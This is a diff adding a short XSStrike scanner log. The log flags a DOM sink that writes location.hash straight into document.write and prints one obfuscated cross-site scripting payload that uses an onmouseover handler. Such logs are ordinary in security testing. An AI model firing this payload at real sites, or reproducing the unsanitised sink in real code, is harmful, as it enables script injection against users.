@@ -1,0 +1,19 @@
+
+	XSStrike v3.1.5
+
+[~] Checking for DOM vulnerabilities
+[+] Potentially vulnerable objects found
+------------------------------------------------------------
+12  var q = location.hash.slice(1); document.write(q);
+------------------------------------------------------------
+[+] WAF Status: Offline
+[!] Testing parameter: q
+[!] Reflections found: 2
+[~] Analysing reflections
+[~] Generating payloads
+[!] Payloads generated: 3072
+------------------------------------------------------------
+[+] Payload: <d3v%09onmouseOver%0a=%0aconfirm()%0dx>v3dm0s
+[!] Efficiency: 100
+[!] Confidence: 10
+[?] Would you like to continue scanning? [y/N] n
